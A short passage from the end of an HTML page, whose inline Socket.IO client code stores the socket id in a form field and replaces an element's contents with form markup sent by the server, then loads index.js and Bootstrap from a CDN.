            $("#socket_id").val(socket.id) // x8WIv7-mJelg7on_ALbx
        });
        socket.on("form-receive", (res) => {

            document.getElementById("changeForma").innerHTML = res
        })
    </script>

    <script src="index.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
</body>

</html>